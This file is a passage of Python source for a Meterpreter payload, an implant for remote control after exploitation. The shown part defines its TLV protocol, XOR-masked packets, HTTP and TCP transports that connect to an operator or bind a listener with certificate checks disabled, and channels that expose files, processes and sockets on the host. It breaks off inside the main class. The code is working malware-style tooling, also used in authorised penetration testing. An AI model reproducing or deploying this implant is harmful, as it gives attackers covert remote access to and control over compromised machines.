#!/usr/bin/python
import binascii
import code
import os
import platform
import random
import re
import select
import socket
import struct
import subprocess
import sys
import threading
import time
import traceback

try:
    import ctypes
except ImportError:
    has_windll = False
else:
    has_windll = hasattr(ctypes, 'windll')

try:
    urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
    if sys.version_info[0] < 3:
        urllib = __import__('urllib2', fromlist=urllib_imports)
    else:
        urllib = __import__('urllib.request', fromlist=urllib_imports)
except ImportError:
    has_urllib = False
else:
    has_urllib = True

if sys.version_info[0] < 3:
    is_str = lambda obj: issubclass(obj.__class__, str)
    is_bytes = lambda obj: issubclass(obj.__class__, str)
    bytes = lambda *args: str(*args[:1])
    NULL_BYTE = '\x00'
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
    if isinstance(__builtins__, dict):
        is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
        str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
    else:
        is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
        str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
    is_bytes = lambda obj: issubclass(obj.__class__, bytes)
    NULL_BYTE = bytes('\x00', 'UTF-8')
    long = int
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)

# reseed the random generator.
random.seed()

#
# Constants
#

# these values will be patched, DO NOT CHANGE THEM
DEBUGGING = False
TRY_TO_FORK = True
HTTP_CONNECTION_URL = None
HTTP_PROXY = None
HTTP_USER_AGENT = None
HTTP_COOKIE = None
HTTP_HOST = None
HTTP_REFERER = None
PAYLOAD_UUID = ''
SESSION_GUID = ''
SESSION_COMMUNICATION_TIMEOUT = 300
SESSION_EXPIRATION_TIMEOUT = 604800
SESSION_RETRY_TOTAL = 3600
SESSION_RETRY_WAIT = 10

PACKET_TYPE_REQUEST        = 0
PACKET_TYPE_RESPONSE       = 1
PACKET_TYPE_PLAIN_REQUEST  = 10
PACKET_TYPE_PLAIN_RESPONSE = 11

ERROR_SUCCESS = 0
# not defined in original C implementation
ERROR_FAILURE = 1
ERROR_FAILURE_PYTHON = 2
ERROR_FAILURE_WINDOWS = 3

CHANNEL_CLASS_BUFFERED = 0
CHANNEL_CLASS_STREAM   = 1
CHANNEL_CLASS_DATAGRAM = 2
CHANNEL_CLASS_POOL     = 3

#
# TLV Meta Types
#
TLV_META_TYPE_NONE       = (   0   )
TLV_META_TYPE_STRING     = (1 << 16)
TLV_META_TYPE_UINT       = (1 << 17)
TLV_META_TYPE_RAW        = (1 << 18)
TLV_META_TYPE_BOOL       = (1 << 19)
TLV_META_TYPE_QWORD      = (1 << 20)
TLV_META_TYPE_COMPRESSED = (1 << 29)
TLV_META_TYPE_GROUP      = (1 << 30)
TLV_META_TYPE_COMPLEX    = (1 << 31)
# not defined in original
TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)

#
# TLV base starting points
#
TLV_RESERVED   = 0
TLV_EXTENSIONS = 20000
TLV_USER       = 40000
TLV_TEMP       = 60000

#
# TLV Specific Types
#
TLV_TYPE_ANY                   = TLV_META_TYPE_NONE    | 0
TLV_TYPE_METHOD                = TLV_META_TYPE_STRING  | 1
TLV_TYPE_REQUEST_ID            = TLV_META_TYPE_STRING  | 2
TLV_TYPE_EXCEPTION             = TLV_META_TYPE_GROUP   | 3
TLV_TYPE_RESULT                = TLV_META_TYPE_UINT    | 4

TLV_TYPE_STRING                = TLV_META_TYPE_STRING  | 10
TLV_TYPE_UINT                  = TLV_META_TYPE_UINT    | 11
TLV_TYPE_BOOL                  = TLV_META_TYPE_BOOL    | 12

TLV_TYPE_LENGTH                = TLV_META_TYPE_UINT    | 25
TLV_TYPE_DATA                  = TLV_META_TYPE_RAW     | 26
TLV_TYPE_FLAGS                 = TLV_META_TYPE_UINT    | 27

TLV_TYPE_CHANNEL_ID            = TLV_META_TYPE_UINT    | 50
TLV_TYPE_CHANNEL_TYPE          = TLV_META_TYPE_STRING  | 51
TLV_TYPE_CHANNEL_DATA          = TLV_META_TYPE_RAW     | 52
TLV_TYPE_CHANNEL_DATA_GROUP    = TLV_META_TYPE_GROUP   | 53
TLV_TYPE_CHANNEL_CLASS         = TLV_META_TYPE_UINT    | 54
TLV_TYPE_CHANNEL_PARENTID      = TLV_META_TYPE_UINT    | 55

TLV_TYPE_SEEK_WHENCE           = TLV_META_TYPE_UINT    | 70
TLV_TYPE_SEEK_OFFSET           = TLV_META_TYPE_UINT    | 71
TLV_TYPE_SEEK_POS              = TLV_META_TYPE_UINT    | 72

TLV_TYPE_EXCEPTION_CODE        = TLV_META_TYPE_UINT    | 300
TLV_TYPE_EXCEPTION_STRING      = TLV_META_TYPE_STRING  | 301

TLV_TYPE_LIBRARY_PATH          = TLV_META_TYPE_STRING  | 400
TLV_TYPE_TARGET_PATH           = TLV_META_TYPE_STRING  | 401

TLV_TYPE_TRANS_TYPE            = TLV_META_TYPE_UINT    | 430
TLV_TYPE_TRANS_URL             = TLV_META_TYPE_STRING  | 431
TLV_TYPE_TRANS_UA              = TLV_META_TYPE_STRING  | 432
TLV_TYPE_TRANS_COMM_TIMEOUT    = TLV_META_TYPE_UINT    | 433
TLV_TYPE_TRANS_SESSION_EXP     = TLV_META_TYPE_UINT    | 434
TLV_TYPE_TRANS_CERT_HASH       = TLV_META_TYPE_RAW     | 435
TLV_TYPE_TRANS_PROXY_HOST      = TLV_META_TYPE_STRING  | 436
TLV_TYPE_TRANS_PROXY_USER      = TLV_META_TYPE_STRING  | 437
TLV_TYPE_TRANS_PROXY_PASS      = TLV_META_TYPE_STRING  | 438
TLV_TYPE_TRANS_RETRY_TOTAL     = TLV_META_TYPE_UINT    | 439
TLV_TYPE_TRANS_RETRY_WAIT      = TLV_META_TYPE_UINT    | 440
TLV_TYPE_TRANS_HEADERS         = TLV_META_TYPE_STRING  | 441
TLV_TYPE_TRANS_GROUP           = TLV_META_TYPE_GROUP   | 442

TLV_TYPE_MACHINE_ID            = TLV_META_TYPE_STRING  | 460
TLV_TYPE_UUID                  = TLV_META_TYPE_RAW     | 461
TLV_TYPE_SESSION_GUID          = TLV_META_TYPE_RAW     | 462

TLV_TYPE_PEER_HOST             = TLV_META_TYPE_STRING  | 1500
TLV_TYPE_PEER_PORT             = TLV_META_TYPE_UINT    | 1501
TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503

EXPORTED_SYMBOLS = {}
EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING

# Packet header sizes
ENC_NONE = 0
PACKET_XOR_KEY_SIZE = 4
PACKET_SESSION_GUID_SIZE = 16
PACKET_ENCRYPT_FLAG_SIZE = 4
PACKET_LENGTH_SIZE = 4
PACKET_TYPE_SIZE = 4
PACKET_LENGTH_OFF = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
        PACKET_ENCRYPT_FLAG_SIZE)
PACKET_HEADER_SIZE = (PACKET_XOR_KEY_SIZE + PACKET_SESSION_GUID_SIZE +
        PACKET_ENCRYPT_FLAG_SIZE + PACKET_LENGTH_SIZE + PACKET_TYPE_SIZE)

class SYSTEM_INFO(ctypes.Structure):
    _fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
        ("wReserved", ctypes.c_uint16),
        ("dwPageSize", ctypes.c_uint32),
        ("lpMinimumApplicationAddress", ctypes.c_void_p),
        ("lpMaximumApplicationAddress", ctypes.c_void_p),
        ("dwActiveProcessorMask", ctypes.c_uint32),
        ("dwNumberOfProcessors", ctypes.c_uint32),
        ("dwProcessorType", ctypes.c_uint32),
        ("dwAllocationGranularity", ctypes.c_uint32),
        ("wProcessorLevel", ctypes.c_uint16),
        ("wProcessorRevision", ctypes.c_uint16)]

def rand_xor_key():
    return tuple(random.randint(1, 255) for _ in range(4))

def xor_bytes(key, data):
    if sys.version_info[0] < 3:
        dexored = ''.join(chr(ord(data[i]) ^ key[i % len(key)]) for i in range(len(data)))
    else:
        dexored = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
    return dexored

def export(symbol):
    EXPORTED_SYMBOLS[symbol.__name__] = symbol
    return symbol

def generate_request_id():
    chars = 'abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(chars) for x in range(32))

@export
def crc16(data):
    poly = 0x1021
    reg = 0x0000
    if is_str(data):
        data = list(map(ord, data))
    elif is_bytes(data):
        data = list(data)
    data.append(0)
    data.append(0)
    for byte in data:
        mask = 0x80
        while mask > 0:
            reg <<= 1
            if byte & mask:
                reg += 1
            mask >>= 1
            if reg > 0xffff:
                reg &= 0xffff
                reg ^= poly
    return reg

@export
def debug_print(msg):
    if DEBUGGING:
        print(msg)

@export
def debug_traceback(msg=None):
    if DEBUGGING:
        if msg:
            print(msg)
        traceback.print_exc(file=sys.stderr)

@export
def error_result(exception=None):
    if not exception:
        _, exception, _ = sys.exc_info()
    exception_crc = crc16(exception.__class__.__name__)
    if exception_crc == 0x4cb2: # WindowsError
        return error_result_windows(exception.errno)
    else:
        result = ((exception_crc << 16) | ERROR_FAILURE_PYTHON)
    return result

@export
def error_result_windows(error_number=None):
    if not has_windll:
        return ERROR_FAILURE
    if error_number == None:
        error_number = ctypes.windll.kernel32.GetLastError()
    if error_number > 0xffff:
        return ERROR_FAILURE
    result = ((error_number << 16) | ERROR_FAILURE_WINDOWS)
    return result

@export
def get_hdd_label():
    for _, _, files in os.walk('/dev/disk/by-id/'):
        for f in files:
            for p in ['ata-', 'mb-']:
                if f[:len(p)] == p:
                    return f[len(p):]
    return ''

@export
def get_native_arch():
    arch = get_system_arch()
    if arch == 'x64' and ctypes.sizeof(ctypes.c_void_p) == 4:
        arch = 'x86'
    return arch

@export
def get_system_arch():
    uname_info = platform.uname()
    arch = uname_info[4]
    if has_windll:
        sysinfo = SYSTEM_INFO()
        ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
        values = {0:'x86', 5:'armle', 6:'IA64', 9:'x64'}
        arch = values.get(sysinfo.wProcessorArchitecture, uname_info[4])
    if arch == 'x86_64':
        arch = 'x64'
    return arch

@export
def inet_pton(family, address):
    if family == socket.AF_INET6 and '%' in address:
        address = address.split('%', 1)[0]
    if hasattr(socket, 'inet_pton'):
        return socket.inet_pton(family, address)
    elif has_windll:
        WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
        lpAddress = (ctypes.c_ubyte * 28)()
        lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
        if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
            raise Exception('WSAStringToAddress failed')
        if family == socket.AF_INET:
            return ''.join(map(chr, lpAddress[4:8]))
        elif family == socket.AF_INET6:
            return ''.join(map(chr, lpAddress[8:24]))
    raise Exception('no suitable inet_pton functionality is available')

@export
def packet_enum_tlvs(pkt, tlv_type=None):
    offset = 0
    while offset < len(pkt):
        tlv = struct.unpack('>II', pkt[offset:offset + 8])
        if tlv_type is None or (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
            val = pkt[offset + 8:(offset + 8 + (tlv[0] - 8))]
            if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
                val = str(val.split(NULL_BYTE, 1)[0])
            elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
                val = struct.unpack('>I', val)[0]
            elif (tlv[1] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
                val = struct.unpack('>Q', val)[0]
            elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
                val = bool(struct.unpack('b', val)[0])
            elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
                pass
            yield {'type': tlv[1], 'length': tlv[0], 'value': val}
        offset += tlv[0]
    return

@export
def packet_get_tlv(pkt, tlv_type):
    try:
        tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
    except IndexError:
        return {}
    return tlv

@export
def tlv_pack(*args):
    if len(args) == 2:
        tlv = {'type':args[0], 'value':args[1]}
    else:
        tlv = args[0]
    data = ''
    value = tlv['value']
    if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
        if isinstance(value, float):
            value = int(round(value))
        data = struct.pack('>III', 12, tlv['type'], value)
    elif (tlv['type'] & TLV_META_TYPE_QWORD) == TLV_META_TYPE_QWORD:
        data = struct.pack('>IIQ', 16, tlv['type'], value)
    elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
        data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(value))), 'UTF-8')
    else:
        if sys.version_info[0] < 3 and value.__class__.__name__ == 'unicode':
            value = value.encode('UTF-8')
        elif not is_bytes(value):
            value = bytes(value, 'UTF-8')
        if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
            data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
        elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
        elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
        elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
            data = struct.pack('>II', 8 + len(value), tlv['type']) + value
    return data

@export
def tlv_pack_request(method, parts=None):
    pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
    pkt += tlv_pack(TLV_TYPE_METHOD, method)
    pkt += tlv_pack(TLV_TYPE_UUID, binascii.a2b_hex(bytes(PAYLOAD_UUID, 'UTF-8')))
    pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
    parts = parts or []
    for part in parts:
        pkt += tlv_pack(part['type'], part['value'])
    return pkt

#@export
class MeterpreterChannel(object):
    def core_close(self, request, response):
        self.close()
        return ERROR_SUCCESS, response

    def core_eof(self, request, response):
        response += tlv_pack(TLV_TYPE_BOOL, self.eof())
        return ERROR_SUCCESS, response

    def core_read(self, request, response):
        length = packet_get_tlv(request, TLV_TYPE_LENGTH)['value']
        response += tlv_pack(TLV_TYPE_CHANNEL_DATA, self.read(length))
        return ERROR_SUCCESS, response

    def core_write(self, request, response):
        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
        response += tlv_pack(TLV_TYPE_LENGTH, self.write(channel_data))
        return ERROR_SUCCESS, response

    def close(self):
        raise NotImplementedError()

    def eof(self):
        return False

    def is_alive(self):
        return True

    def notify(self):
        return None

    def read(self, length):
        raise NotImplementedError()

    def write(self, data):
        raise NotImplementedError()

#@export
class MeterpreterFile(MeterpreterChannel):
    def __init__(self, file_obj):
        self.file_obj = file_obj
        super(MeterpreterFile, self).__init__()

    def close(self):
        self.file_obj.close()

    def eof(self):
        return self.file_obj.tell() >= os.fstat(self.file_obj.fileno()).st_size

    def read(self, length):
        return self.file_obj.read(length)

    def write(self, data):
        self.file_obj.write(data)
        return len(data)
export(MeterpreterFile)

#@export
class MeterpreterProcess(MeterpreterChannel):
    def __init__(self, proc_h):
        self.proc_h = proc_h
        super(MeterpreterProcess, self).__init__()

    def close(self):
        self.proc_h.kill()
        if hasattr(self.proc_h.stdin, 'close'):
            self.proc_h.stdin.close()
        if hasattr(self.proc_h.stdout, 'close'):
            self.proc_h.stdout.close()
        if hasattr(self.proc_h.stderr, 'close'):
            self.proc_h.stderr.close()

    def is_alive(self):
        return self.proc_h.poll() is None

    def read(self, length):
        data = ''
        stdout_reader = self.proc_h.stdout_reader
        if stdout_reader.is_read_ready():
            data = stdout_reader.read(length)
        return data

    def write(self, data):
        self.proc_h.write(data)
        return len(data)
export(MeterpreterProcess)

#@export
class MeterpreterSocket(MeterpreterChannel):
    def __init__(self, sock):
        self.sock = sock
        self._is_alive = True
        super(MeterpreterSocket, self).__init__()

    def core_write(self, request, response):
        try:
            status, response = super(MeterpreterSocket, self).core_write(request, response)
        except socket.error:
            self.close()
            self._is_alive = False
            status = ERROR_FAILURE
        return status, response

    def close(self):
        return self.sock.close()

    def fileno(self):
        return self.sock.fileno()

    def is_alive(self):
        return self._is_alive

    def read(self, length):
        return self.sock.recv(length)

    def write(self, data):
        return self.sock.send(data)
export(MeterpreterSocket)

#@export
class MeterpreterSocketTCPClient(MeterpreterSocket):
    pass
export(MeterpreterSocketTCPClient)

#@export
class MeterpreterSocketTCPServer(MeterpreterSocket):
    pass
export(MeterpreterSocketTCPServer)

#@export
class MeterpreterSocketUDPClient(MeterpreterSocket):
    def __init__(self, sock, peer_address=None):
        super(MeterpreterSocketUDPClient, self).__init__(sock)
        self.peer_address = peer_address

    def core_write(self, request, response):
        peer_host = packet_get_tlv(request, TLV_TYPE_PEER_HOST).get('value')
        peer_port = packet_get_tlv(request, TLV_TYPE_PEER_PORT).get('value')
        if peer_host and peer_port:
            peer_address = (peer_host, peer_port)
        elif self.peer_address:
            peer_address = self.peer_address
        else:
            raise RuntimeError('peer_host and peer_port must be specified with an unbound/unconnected UDP channel')
        channel_data = packet_get_tlv(request, TLV_TYPE_CHANNEL_DATA)['value']
        try:
            length = self.sock.sendto(channel_data, peer_address)
        except socket.error:
            self.close()
            self._is_alive = False
            status = ERROR_FAILURE
        else:
            response += tlv_pack(TLV_TYPE_LENGTH, length)
            status = ERROR_SUCCESS
        return status, response

    def read(self, length):
        return self.sock.recvfrom(length)[0]

    def write(self, data):
        self.sock.sendto(data, self.peer_address)
export(MeterpreterSocketUDPClient)

class STDProcessBuffer(threading.Thread):
    def __init__(self, std, is_alive):
        threading.Thread.__init__(self)
        self.std = std
        self.is_alive = is_alive
        self.data = bytes()
        self.data_lock = threading.RLock()

    def run(self):
        for byte in iter(lambda: self.std.read(1), bytes()):
            self.data_lock.acquire()
            self.data += byte
            self.data_lock.release()

    def is_read_ready(self):
        return len(self.data) != 0

    def peek(self, l = None):
        data = bytes()
        self.data_lock.acquire()
        if l == None:
            data = self.data
        else:
            data = self.data[0:l]
        self.data_lock.release()
        return data

    def read(self, l = None):
        self.data_lock.acquire()
        data = self.peek(l)
        self.data = self.data[len(data):]
        self.data_lock.release()
        return data

#@export
class STDProcess(subprocess.Popen):
    def __init__(self, *args, **kwargs):
        debug_print('[*] starting process: ' + repr(args[0]))
        subprocess.Popen.__init__(self, *args, **kwargs)
        self.echo_protection = False

    def is_alive(self):
        return self.poll() is None

    def start(self):
        self.stdout_reader = STDProcessBuffer(self.stdout, self.is_alive)
        self.stdout_reader.start()
        self.stderr_reader = STDProcessBuffer(self.stderr, self.is_alive)
        self.stderr_reader.start()

    def write(self, channel_data):
        length = self.stdin.write(channel_data)
        self.stdin.flush()
        if self.echo_protection:
            end_time = time.time() + 0.5
            out_data = bytes()
            while (time.time() < end_time) and (out_data != channel_data):
                if self.stdout_reader.is_read_ready():
                    out_data = self.stdout_reader.peek(len(channel_data))
            if out_data == channel_data:
                self.stdout_reader.read(len(channel_data))
        return length
export(STDProcess)

class Transport(object):
    def __init__(self):
        self.communication_timeout = SESSION_COMMUNICATION_TIMEOUT
        self.communication_last = 0
        self.retry_total = SESSION_RETRY_TOTAL
        self.retry_wait = SESSION_RETRY_WAIT
        self.request_retire = False

    def __repr__(self):
        return "<{0} url='{1}' >".format(self.__class__.__name__, self.url)

    @property
    def communication_has_expired(self):
        return self.communication_last + self.communication_timeout < time.time()

    @property
    def should_retire(self):
        return self.communication_has_expired or self.request_retire

    @staticmethod
    def from_request(request):
        url = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
        if url.startswith('tcp'):
            transport = TcpTransport(url)
        elif url.startswith('http'):
            proxy = packet_get_tlv(request, TLV_TYPE_TRANS_PROXY_HOST).get('value')
            user_agent = packet_get_tlv(request, TLV_TYPE_TRANS_UA).get('value', HTTP_USER_AGENT)
            http_headers = packet_get_tlv(request, TLV_TYPE_TRANS_HEADERS).get('value', None)
            transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
            if http_headers:
                headers = {}
                for h in http_headers.strip().split("\r\n"):
                    p = h.split(':')
                    headers[p[0].upper()] = ''.join(p[1:0])
                http_host = headers.get('HOST')
                http_cookie = headers.get('COOKIE')
                http_referer = headers.get('REFERER')
                transport = HttpTransport(url, proxy=proxy, user_agent=user_agent, http_host=http_host,
                        http_cookie=http_cookie, http_referer=http_referer)
        transport.communication_timeout = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT).get('value', SESSION_COMMUNICATION_TIMEOUT)
        transport.retry_total = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_TOTAL).get('value', SESSION_RETRY_TOTAL)
        transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
        return transport

    def _activate(self):
        return True

    def activate(self):
        end_time = time.time() + self.retry_total
        while time.time() < end_time:
            try:
                activate_succeeded = self._activate()
            except:
                activate_succeeded = False
            if activate_succeeded:
                self.communication_last = time.time()
                return True
            time.sleep(self.retry_wait)
        return False

    def _deactivate(self):
        return

    def deactivate(self):
        try:
            self._deactivate()
        except:
            pass
        self.communication_last = 0
        return True

    def decrypt_packet(self, pkt):
        if pkt and len(pkt) > PACKET_HEADER_SIZE:
            # We don't support AES encryption yet, so just do the normal
            # XOR thing and move on
            xor_key = struct.unpack('BBBB', pkt[:PACKET_XOR_KEY_SIZE])
            raw = xor_bytes(xor_key, pkt)
            return raw[PACKET_HEADER_SIZE:]
        return None

    def get_packet(self):
        self.request_retire = False
        try:
            pkt = self.decrypt_packet(self._get_packet())
        except:
            debug_traceback()
            return None
        if pkt is None:
            return None
        self.communication_last = time.time()
        return pkt

    def encrypt_packet(self, pkt):
        # The packet now has to contain session GUID and encryption flag info
        # And given that we're not yet supporting AES, we're going to just
        # always return the session guid and the encryption flag set to 0
        # TODO: we'll add encryption soon!
        xor_key = rand_xor_key()
        raw = binascii.a2b_hex(bytes(SESSION_GUID, 'UTF-8')) + struct.pack('>I', ENC_NONE) + pkt
        result = struct.pack('BBBB', *xor_key) + xor_bytes(xor_key, raw)
        return result

    def send_packet(self, pkt):
        pkt = struct.pack('>I', len(pkt) + 4) + pkt
        self.request_retire = False
        try:
            self._send_packet(self.encrypt_packet(pkt))
        except:
            debug_traceback()
            return False
        self.communication_last = time.time()
        return True

    def tlv_pack_timeouts(self):
        response  = tlv_pack(TLV_TYPE_TRANS_COMM_TIMEOUT, self.communication_timeout)
        response += tlv_pack(TLV_TYPE_TRANS_RETRY_TOTAL, self.retry_total)
        response += tlv_pack(TLV_TYPE_TRANS_RETRY_WAIT, self.retry_wait)
        return response

    def tlv_pack_transport_group(self):
        trans_group  = tlv_pack(TLV_TYPE_TRANS_URL, self.url)
        trans_group += self.tlv_pack_timeouts()
        return trans_group

class HttpTransport(Transport):
    def __init__(self, url, proxy=None, user_agent=None, http_host=None, http_referer=None, http_cookie=None):
        super(HttpTransport, self).__init__()
        opener_args = []
        scheme = url.split(':', 1)[0]
        if scheme == 'https' and ((sys.version_info[0] == 2 and sys.version_info >= (2, 7, 9)) or sys.version_info >= (3, 4, 3)):
            import ssl
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
            opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
        if proxy:
            opener_args.append(urllib.ProxyHandler({scheme: proxy}))
        self.proxy = proxy
        opener = urllib.build_opener(*opener_args)
        opener.addheaders = []
        if user_agent:
            opener.addheaders.append(('User-Agent', user_agent))
        if http_cookie:
            opener.addheaders.append(('Cookie', http_cookie))
        if http_referer:
            opener.addheaders.append(('Referer', http_referer))
        self.user_agent = user_agent
        urllib.install_opener(opener)
        self.url = url
        self._http_request_headers = {'Content-Type': 'application/octet-stream'}
        if http_host:
            self._http_request_headers['Host'] = http_host
        self._first_packet = None
        self._empty_cnt = 0

    def _activate(self):
        return True
        self._first_packet = None
        packet = self._get_packet()
        if packet is None:
            return False
        self._first_packet = packet
        return True

    def _get_packet(self):
        if self._first_packet:
            packet = self._first_packet
            self._first_packet = None
            return packet
        packet = None
        xor_key = None
        request = urllib.Request(self.url, None, self._http_request_headers)
        try:
            url_h = urllib.urlopen(request, timeout=self.communication_timeout)
            packet = url_h.read()
            for _ in range(1):
                if packet == '':
                    break
                if len(packet) < PACKET_HEADER_SIZE:
                    packet = None  # looks corrupt
                    break
                xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
                header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
                pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0] - 8
                if len(packet) != (pkt_length + PACKET_HEADER_SIZE):
                    packet = None  # looks corrupt
        except:
            debug_traceback('Failure to receive packet from ' + self.url)

        if not packet:
            delay = 10 * self._empty_cnt
            if self._empty_cnt >= 0:
                delay *= 10
            self._empty_cnt += 1
            time.sleep(float(min(10000, delay)) / 1000)
            return packet

        self._empty_cnt = 0
        return packet

    def _send_packet(self, packet):
        request = urllib.Request(self.url, packet, self._http_request_headers)
        url_h = urllib.urlopen(request, timeout=self.communication_timeout)
        response = url_h.read()

    def patch_uri_path(self, new_path):
        match = re.match(r'https?://[^/]+(/.*$)', self.url)
        if match is None:
            return False
        self.url = self.url[:match.span(1)[0]] + new_path
        return True

    def tlv_pack_transport_group(self):
        trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
        if self.user_agent:
            trans_group += tlv_pack(TLV_TYPE_TRANS_UA, self.user_agent)
        if self.proxy:
            trans_group += tlv_pack(TLV_TYPE_TRANS_PROXY_HOST, self.proxy)
        return trans_group

class TcpTransport(Transport):
    def __init__(self, url, socket=None):
        super(TcpTransport, self).__init__()
        self.url = url
        self.socket = socket
        self._cleanup_thread = None
        self._first_packet = True

    def _sock_cleanup(self, sock):
        remaining_time = self.communication_timeout
        while remaining_time > 0:
            iter_start_time = time.time()
            if select.select([sock], [], [], remaining_time)[0]:
                if len(sock.recv(4096)) == 0:
                    break
            remaining_time -= time.time() - iter_start_time
        sock.close()

    def _activate(self):
        address, port = self.url[6:].rsplit(':', 1)
        port = int(port.rstrip('/'))
        timeout = max(self.communication_timeout, 30)
        if address in ('', '0.0.0.0', '::'):
            try:
                server_sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
            except (AttributeError, socket.error):
                server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.bind(('', port))
            server_sock.listen(1)
            if not select.select([server_sock], [], [], timeout)[0]:
                server_sock.close()
                return False
            sock, _ = server_sock.accept()
            server_sock.close()
        else:
            if ':' in address:
                sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((address, port))
            sock.settimeout(None)
        self.socket = sock
        self._first_packet = True
        return True

    def _deactivate(self):
        cleanup = threading.Thread(target=self._sock_cleanup, args=(self.socket,))
        cleanup.run()
        self.socket = None

    def _get_packet(self):
        first = self._first_packet
        self._first_packet = False
        if not select.select([self.socket], [], [], 0.5)[0]:
            return bytes()
        packet = self.socket.recv(PACKET_HEADER_SIZE)
        if packet == '':  # remote is closed
            self.request_retire = True
            return None
        if len(packet) != PACKET_HEADER_SIZE:
            if first and len(packet) == 4:
                received = 0
                header = packet[:4]
                pkt_length = struct.unpack('>I', header)[0]
                self.socket.settimeout(max(self.communication_timeout, 30))
                while received < pkt_length:
                    received += len(self.socket.recv(pkt_length - received))
                self.socket.settimeout(None)
                return self._get_packet()
            return None

        xor_key = struct.unpack('BBBB', packet[:PACKET_XOR_KEY_SIZE])
        # XOR the whole header first
        header = xor_bytes(xor_key, packet[:PACKET_HEADER_SIZE])
        # Extract just the length
        pkt_length = struct.unpack('>I', header[PACKET_LENGTH_OFF:PACKET_LENGTH_OFF+PACKET_LENGTH_SIZE])[0]
        pkt_length -= 8
        # Read the rest of the packet
        rest = bytes()
        while len(rest) < pkt_length:
            rest += self.socket.recv(pkt_length - len(rest))
        # return the whole packet, as it's decoded separately
        return packet + rest

    def _send_packet(self, packet):
        self.socket.send(packet)

    @classmethod
    def from_socket(cls, sock):
        url = 'tcp://'
        address, port = sock.getsockname()[:2]
        # this will need to be changed if the bind stager ever supports binding to a specific address
        if not address in ('', '0.0.0.0', '::'):
            address, port = sock.getpeername()[:2]
        url += address + ':' + str(port)
        return cls(url, sock)

class PythonMeterpreter(object):
    def __init__(self, transport):
        self.transport = transport
        self._transport_sleep = None
        self.running = False
        self.last_registered_extension = None
        self.extension_functions = {}
        self.channels = {}
        self.next_channel_id = 1
        self.interact_channels = []
        self.processes = {}
        self.next_process_id = 1
        self.transports = [self.transport]
        self.session_expiry_time = SESSION_EXPIRATION_TIMEOUT
        self.session_expiry_end = time.time() + self.session_expiry_time
        for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
            self.extension_functions[func[1:]] = getattr(self, func)
        self.running = True

    def register_extension(self, extension_name):
        self.last_registered_extension = extension_name
        return self.last_registered_extension

    def register_function(self, func):
        self.extension_functions[func.__name__] = func
        return func

    def register_function_if(self, condition):
        if condition:
            return self.register_function
        else:
            return lambda function: function

    def register_function_windll(self, func):
        if has_windll:
            self.register_function(func)
        return func

    def add_channel(self, channel):
